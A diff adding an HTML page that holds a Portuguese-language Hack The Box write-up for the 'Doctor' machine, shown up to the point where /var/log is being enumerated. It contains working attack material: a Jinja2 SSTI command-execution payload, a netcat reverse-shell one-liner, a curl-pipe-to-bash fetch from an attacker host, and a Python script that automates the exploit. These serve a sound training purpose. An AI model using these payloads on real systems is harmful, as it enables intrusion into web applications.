@@ -1,0 +1,1436 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.21.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Hackthebox write-up: Doctor | Davi Cruz</title>
+<meta name="description" content="Olá pessoal!  Começando a postar sobre alguns write-ups de máquinas estilo CTF, a primeira a ser resolvida será Doctor, uma máquina Linux classificada como fácil do Hack The Box criada por egotisticalSW.">
+
+
+  <meta name="author" content="Davi Cruz">
+  
+  <meta property="article:author" content="Davi Cruz">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Davi Cruz">
+<meta property="og:title" content="Hackthebox write-up: Doctor">
+<meta property="og:url" content="https://davicruz.com/writeup/2021/02/htb-doctor/">
+
+
+  <meta property="og:description" content="Olá pessoal!  Começando a postar sobre alguns write-ups de máquinas estilo CTF, a primeira a ser resolvida será Doctor, uma máquina Linux classificada como fácil do Hack The Box criada por egotisticalSW.">
+
+
+
+  <meta property="og:image" content="https://i.imgur.com/EeJREQG.png">
+
+
+
+  <meta name="twitter:site" content="@zerahzurc">
+  <meta name="twitter:title" content="Hackthebox write-up: Doctor">
+  <meta name="twitter:description" content="Olá pessoal!  Começando a postar sobre alguns write-ups de máquinas estilo CTF, a primeira a ser resolvida será Doctor, uma máquina Linux classificada como fácil do Hack The Box criada por egotisticalSW.">
+  <meta name="twitter:domain" content="davicruz.com">
+  <meta name="twitter:url" content="https://davicruz.com/writeup/2021/02/htb-doctor/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="https://i.imgur.com/EeJREQG.png">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2021-02-06T09:00:00-03:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://davicruz.com/writeup/2021/02/htb-doctor/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Davi Cruz",
+      "url": "https://davicruz.com/",
+      "sameAs": ["https://twitter.com/zerahzurc","https://www.linkedin.com/in/davicruz","https://github.com/davi-cruz"]
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="hrWV-PqvbpxEy2HdpVYFQNws2Sz_tROleVyF18s2kWA" />
+
+
+  <meta name="msvalidate.01" content="60B1FA6CDAF15D226AB529AF30386BD8">
+
+
+
+  <meta name="yandex-verification" content="08de8d8c0326420f">
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Davi Cruz Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+<!-- Favicon -->
+<link rel="shortcut icon" href="/assets/images/favicon.ico" />
+
+<!-- Multilang tags -->
+
+    
+<link rel="alternate" hreflang="pt-BR" href="/writeup/2021/02/htb-doctor/">
+    
+
+    
+<link rel="alternate" hreflang="en-US" href="/en-US/writeup/2021/02/htb-doctor/">
+    
+
+
+<!-- Cookie Consent - Osano -->
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.css" />
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          
+          <a class="site-logo" href="https://davicruz.com"><img src="/assets/images/logo.png" alt="Davi Cruz"></a>
+          
+          <a class="site-title" href="https://davicruz.com">
+            Davi Cruz
+            
+          </a>
+        
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+            <a href="/categorias/">Categorias</a>
+          </li>
+<li class="masthead__menu-item">
+            <a href="/tags/">Tags</a>
+          </li>
+<li class="masthead__menu-item">
+            <a href="/sobre/">Sobre</a>
+          </li>
+</ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Buscar</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/bio-photo.jpg" alt="Davi Cruz" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Davi Cruz</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Apenas mais um profissional de Cibersegurança</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Acompanhe no</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">São Paulo, BR</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fab fa-linkedin" aria-hidden="true"></i><span class="label">Linkedin</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+<li>
+  <strong></strong>
+  
+  <a class="link-en" href=""></a>
+  
+</li>
+
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hackthebox write-up: Doctor">
+    <meta itemprop="description" content="Olá pessoal!Começando a postar sobre alguns write-ups de máquinas estilo CTF, a primeira a ser resolvida será Doctor, uma máquina Linux classificada como fácil do Hack The Box criada por egotisticalSW.">
+    <meta itemprop="datePublished" content="2021-02-06T09:00:00-03:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hackthebox write-up: Doctor
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-02-06T09:00:00-03:00">February 6, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          11 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/02/htb-doctor/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p>Olá pessoal!</p>
+
+<p>Começando a postar sobre alguns write-ups de máquinas estilo CTF, a primeira a ser resolvida será <strong>Doctor</strong>, uma máquina Linux classificada como fácil do <a href="https://www.hackthebox.eu">Hack The Box</a> criada por <a href="https://app.hackthebox.eu/users/94858">egotisticalSW</a>.<!--more--></p>
+
+<p class="notice--info"><img class="emoji" title=":information_source:" alt=":information_source:" src="https://github.githubassets.com/images/icons/emoji/unicode/2139.png" height="20" width="20"> <strong>Info</strong>: Write-ups para máquinas do Hack The Box serão postados assim que as máquinas sejam aposentadas, então segue abaixo a primeira <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20">!</p>
+
+<p><img src="https://i.imgur.com/7DBDPWU.png" alt="HTB Doctor" class="align-center"></p>
+
+<h2 id="enumeração">Enumeração</h2>
+
+<p>Então vamos começar com uma enumeração rápida utilizando o <code class="language-plaintext highlighter-rouge">nmap</code>. Executando um quick scan obtive o seguinte resultado, onde foi possível notar dois serviços HTTP, além de uma porta de SSH aberta:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.209
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-14 19:46 <span class="nt">-03</span>
+Nmap scan report <span class="k">for </span>10.10.10.209
+Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 filtered ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http     Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Doctor
+8089/tcp open  ssl/http Splunkd httpd
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Splunkd
+|_http-title: splunkd
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SplunkServerDefaultCert/organizationName<span class="o">=</span>SplunkUser
+| Not valid before: 2020-09-06T15:57:27
+|_Not valid after:  2023-09-06T15:57:27
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>63.98 seconds
+                                                                          
+</code></pre></div></div>
+
+<h3 id="80-tcp---serviço-http">80 TCP - Serviço HTTP</h3>
+
+<p>Antes de começar a enumeração, navegando no website utilizando o browser, notei de que se trata de um site institucional, que menciona um endereço de e-mail <strong>info@doctors.htb</strong>, onde o domínio <code class="language-plaintext highlighter-rouge">doctors.htb</code> deve se tratar do FQDN desta máquina.</p>
+
+<p><img src="https://i.imgur.com/cRUWuPh.png" alt="HTB Doctor - 80/TCP" class="align-center"></p>
+
+<p>Para garantir que a enumeração dos serviços HTTP seja feita corretamente, caso algum deles esteja sendo publicado por este DNS, alterei o arquivo hosts local para refletir o nome correto para o endereço IP da máquina, podendo assim iniciar o processo de enumeração dos serviços.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-i</span>
+<span class="c"># echo " " &gt;&gt; /etc/hosts</span>
+<span class="c"># echo "# HTB Doctors" &gt;&gt; /etc/hosts</span>
+<span class="c"># echo "10.10.10.209 doctors.htb" &gt;&gt; /etc/hosts</span>
+<span class="c"># cat /etc/hosts</span>
+
+127.0.0.1       localhost
+127.0.1.1       kali
+
+<span class="c"># The following lines are desirable for IPv6 capable hosts</span>
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+ 
+<span class="c"># HTB Doctors</span>
+10.10.10.209 doctors.htb
+</code></pre></div></div>
+
+<p>Após alterar a entrada, uma vez acessando novamente a porta 80/TPC, desta vez via hostname, uma página diferente é exibida, conforme podemos ver abaixo:</p>
+
+<p><img src="https://i.imgur.com/bnqIzON.png" alt="HTB Doctor - Secure Messaging" class="align-center"></p>
+
+<p>Agora que confirmamos que a máquina possui um outro serviço publicado usando o dns, vamos começar enumerando os dois websites, tanto com DNS quanto IP, para que possamos buscar por alguma oportunidade interessante para um acesso inicial.</p>
+
+<h4 id="whatweb">Whatweb</h4>
+
+<p>Verificando o output do <code class="language-plaintext highlighter-rouge">whatweb</code> de ambos os scans, podemos notar que os dois websites são publicados utilizando diferentes webservers, conforme abaixo:</p>
+
+<ul>
+  <li>Via IP address: <code class="language-plaintext highlighter-rouge">Apache[2.4.41], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], Email[info@doctors.htb], HTML5, Script, Bootstrap[4.3.1], JQuery[3.3.1]</code>
+</li>
+  <li>Via DNS: <code class="language-plaintext highlighter-rouge">HTTPServer[Werkzeug/1.0.1 Python/3.8.2], Cookies[session], Python[3.8.2], HttpOnly[session], Werkzeug[1.0.1], RedirectLocation[http://doctors.htb/login?next=%2F]</code>
+</li>
+</ul>
+
+<h4 id="enumerando-o-website-manualmente">Enumerando o website manualmente</h4>
+
+<p>Enquanto validando o website notei que na página de login havia também a possibilidade de resetar uma senha ou criar uma conta. A informação de endereço de e-mail que temos (info@doctors.htb) foi a primeira a ser testada mas os erros recebidos indicaram que a conta não existia.</p>
+
+<p>Após algumas tentativas, tentando manipular os requests de alteração de senha, decidi por mudar de estratégia e tentar criar uma conta.</p>
+
+<p><img src="https://i.imgur.com/fSXdu3M.png" alt="HTB Doctor - Secure Messaging - Creating User" class="align-center"></p>
+
+<p>Depois de criá-la com sucesso, uma mensagem de aviso foi exibida conforme abaixo, o que significa que <strong>teremos apenas 20 minutos para utilizar a conta no site</strong>.</p>
+
+<p><img src="https://i.imgur.com/R7dtMR4.png" alt="HTB Doctor - Secure Messaging - Account creation" class="align-center"></p>
+
+<p>Depois de criada, iniciada a enumeração pelo código fonte da página, onde encontrei um diretorio <code class="language-plaintext highlighter-rouge">/archive</code> comentado no código, mas nada foi exibido quando acessei a página pela primeira vez.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c">&lt;!--archive still under beta testing&lt;a class="nav-item nav-link" href="/archive"&gt;Archive&lt;/a&gt;--&gt;</span>
+</code></pre></div></div>
+
+<p>Avaliando as demais possibilidades parti para a criação de uma nova mensagem, uma das opções disponíveis, onde inseri o seguinte conteúdo para testes:</p>
+
+<p><img src="https://i.imgur.com/JT3MZfR.png" alt="HTB Doctor - Secure Messaging - New Post" class="align-center"></p>
+
+<p>Acessando a mensagem postada na sequência, notei que é direcionado para a URL <code class="language-plaintext highlighter-rouge">http://doctors.htb/post/2</code> mas também não consegui identificar nenhuma outra oportunidade de exploração neste ponto, apenas as opções padrão para alterar ou deletar a mensagem.</p>
+
+<p>Manipulando a url, consegui acessar outros posts, como por exemplo <code class="language-plaintext highlighter-rouge">http://doctors.htb/post/1</code> que se tratava de uma mensagem do usuário <code class="language-plaintext highlighter-rouge">admin</code> mas que não possuia nenhuma informação relevante.</p>
+
+<p>As coisas ficaram interessantes quando decidi acessar novamente o <code class="language-plaintext highlighter-rouge">/archive</code>, onde o conteúdo do título utilizado na mensagem criada foi exibido, o que levantou a possibilidade de obter um acesso inicial a partir da exploração via <em>Server-Side Template Injection (SSTI)</em>.</p>
+
+<p>Para confirmar a possibilidade, seguindo o que encontrei em <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#identify">SSTI (Server Side Template Injection) - HackTricks</a>, troquei o conteúdo do título da minha mensagem anterior para testar alguns tipos de injeção sugeridos, que nos permitirá identificar qual a engine utilizada e, posteriormente, criar o conteúdo malicioso para obter um acesso inicial.</p>
+
+<p><img src="https://i.imgur.com/vVVwKY2.png" alt="HTB Doctor - Secure Messaging - SSTI test" class="align-center"></p>
+
+<p>Esta injeção funcionou com sucesso, indicando que temos um website construido com Twig ou Jinja2 <img class="emoji" title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"> (o que faz sentido, já que o webservice é publicado utilizando <strong>Werkzeug</strong>, conforme pudemos notar via whatweb, que é um servidor web muito popular utilizado normalmente em conjunto com Flask ou Django).</p>
+
+<p><img src="https://i.imgur.com/EH0zQHN.png" alt="HTB Doctor - SSTI output " class="align-center"></p>
+
+<p>Depois de alguns testes, brincando com exemplos disponíveis em <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings (github.com)</a>, consegui confirmar que a engine utilizada é <strong>Jinja2</strong>, onde o conteúdo abaixo funcionou sem problemas, dentre outros:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span><span class="n">config</span><span class="p">.</span><span class="n">items</span><span class="p">()}}</span>
+</code></pre></div></div>
+
+<h2 id="acesso-inicial">Acesso inicial</h2>
+
+<p>Após confirmado que um payload para Jinja2 deveria ser utilizado, foi possível obter um shell reverso na máquina através do seguinte processo:</p>
+
+<ul>
+  <li>
+    <p>Em uma pasta na máquina do atacante, criei um arquivo de payload contendo a string que, uma vez executada, nos retornaria um shell reverso na porta 4443;</p>
+
+    <div class="language-bash highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.10.10 4443 <span class="o">&gt;</span>/tmp/f
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Este arquivo foi publicado a partir de um server HTTP simples utilizando python3, conforme execução do comando abaixo a partir do diretório onde o arquivo criado está localizado;</p>
+
+    <div class="language-bash highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>  <span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>No portal, criei um novo post inserindo no lugar da string <code class="language-plaintext highlighter-rouge">title</code>, o conteúdo obtido no link acima citado do PayloadsAllTheThings. Este especificamente é bem interessante, pois nos permite executar comandos de forma dinâmica a partir do conteúdo recebido da variável <strong>input</strong> em um request do tipo GET, evitando assim modificar frequentemente o conteúdo da injeção:</p>
+
+    <div class="language-python highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="s">"warning"</span> <span class="ow">in</span> <span class="n">x</span><span class="p">.</span><span class="n">__name__</span> <span class="o">%</span><span class="p">}{{</span><span class="n">x</span><span class="p">().</span><span class="n">_module</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s">'__import__'</span><span class="p">](</span><span class="s">'os'</span><span class="p">).</span><span class="n">popen</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nb">input</span><span class="p">).</span><span class="n">read</span><span class="p">()}}{</span><span class="o">%</span><span class="n">endif</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="n">endfor</span><span class="o">%</span><span class="p">}</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Iniciei um listener usando netcat para ouvir na porta configurada no payload usando o comando abaixo;</p>
+
+    <div class="language-bash highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 4443
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>E depois fiz um request no portal, passando o comando que gostaria de ser executado na query string com o comando no input que gostaria que fosse executado.</p>
+
+    <div class="language-bash highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>http://doctors.htb/archive?input<span class="o">=</span>curl%20-L%20http://10.10.10.10/payload%20|%20bash
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>E voilá! Recebi um shell reverso <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20"></p>
+  </li>
+</ul>
+
+<p><img src="https://i.imgur.com/TyHFL9D.png" alt="HTB Doctor - Exploit" class="align-center"></p>
+
+<p class="notice--info"><strong>Bônus</strong>: Pra facilitar na reobtenção deste acesso inicial, uma vez que a conta criada tem a validade curta de 20 min, criei um script simples em python para esta tarefa <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20">.​ Para usá-lo basta configurar o listener e o webserver, da mesma forma que faríamos no método 100% manual, com a diferença de que o script irá recriar o usuário, configurar o payload malicioso na mensagem e fazer o request retornando o shell reverso novamente.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">'http://doctors.htb'</span>
+<span class="n">username</span> <span class="o">=</span> <span class="s">'dummy'</span>
+<span class="n">password</span> <span class="o">=</span> <span class="s">'P@ssw0rd'</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="s">'10.10.10.10'</span>
+<span class="n">email</span> <span class="o">=</span> <span class="n">username</span><span class="o">+</span><span class="s">'@doctors.htb'</span>
+
+<span class="c1"># Create new session
+</span><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
+
+<span class="c1"># Make initial request to get required cookies
+</span><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+
+<span class="c1"># Create user
+</span><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">'username'</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s">'email'</span><span class="p">:</span><span class="n">email</span><span class="p">,</span><span class="s">'password'</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="s">'confirm_password'</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="s">'submit'</span><span class="p">:</span><span class="s">'Sign Up'</span><span class="p">}</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">'/register'</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Login
+</span><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">'email'</span><span class="p">:</span><span class="n">email</span><span class="p">,</span><span class="s">'password'</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="s">'submit'</span><span class="p">:</span><span class="s">'Login'</span><span class="p">}</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">'/login?next=%2Fhome'</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Create message
+</span>
+<span class="n">title</span> <span class="o">=</span> <span class="s">"{% for x in ().__class__.__base__.__subclasses__() %}{% if </span><span class="se">\"</span><span class="s">warning</span><span class="se">\"</span><span class="s"> in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}"</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">'title'</span><span class="p">:</span><span class="n">title</span><span class="p">,</span><span class="s">'content'</span><span class="p">:</span><span class="s">'content'</span><span class="p">,</span><span class="s">'submit'</span><span class="p">:</span><span class="s">'Post'</span><span class="p">}</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">'/post/new'</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Get Reverse shell
+</span><span class="n">command</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">utils</span><span class="p">.</span><span class="n">quote</span><span class="p">(</span><span class="s">'curl -L http://'</span><span class="o">+</span><span class="n">ip</span><span class="o">+</span><span class="s">'/payload | bash'</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">'/archive?input='</span><span class="o">+</span><span class="n">command</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<p>Depois de obter o shell reverso, <a href="https://blog.mrtnrdl.de/infosec/2019/05/23/obtain-a-full-interactive-shell-with-zsh.html">fiz o upgrade dele para ter acesso a funcionalidades de auto-complete, etc</a>, e iniciei o processo de enumeração:</p>
+
+<ul>
+  <li>
+    <p>Os usuários existentes na máquina, com base nas home folders existentes são <strong>shaun</strong> e <strong>web</strong>;</p>
+  </li>
+  <li>
+    <p>Verificando os grupos dos quais o usuário <strong>web</strong> é membro, notei que a conta é membro do grupo <strong>adm</strong>:</p>
+
+    <div class="language-bash highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>web@doctor:/home<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>
+</code></pre></div>    </div>
+
+    <ul>
+      <li>O grupo <strong>adm</strong> no Linux permite acesso a arquivos localizados no diretório <code class="language-plaintext highlighter-rouge">/var/log</code>, que possivelmente pode permitir que consigamos alguma informação sensivel dentro das logs de componentes do sistema como webservers e tarefas agendadas (cron).</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="analizando-as-logs-em-varlog">Analizando as logs em /var/log</h3>
+
+<p>Então para iniciar esta análise vamos buscar quais componentes, alem dos defaults de sistema, temos dentro desta máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>web@doctor:/var/log<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ld</span> <span class="k">*</span>/
+drwxr-x---  2 root              adm             4096 Jan 31 00:00 apache2/
+drwxr-xr-x  2 root              root            4096 Sep  7 12:13 apt/
+drwxr-xr-x  2 root              root            4096 Jan 31 00:00 cups/
+drwxr-xr-x  2 root              root            4096 Apr  8  2020 dist-upgrade/
+drwxr-xr-x  3 root              root            4096 Apr 23  2020 hp/
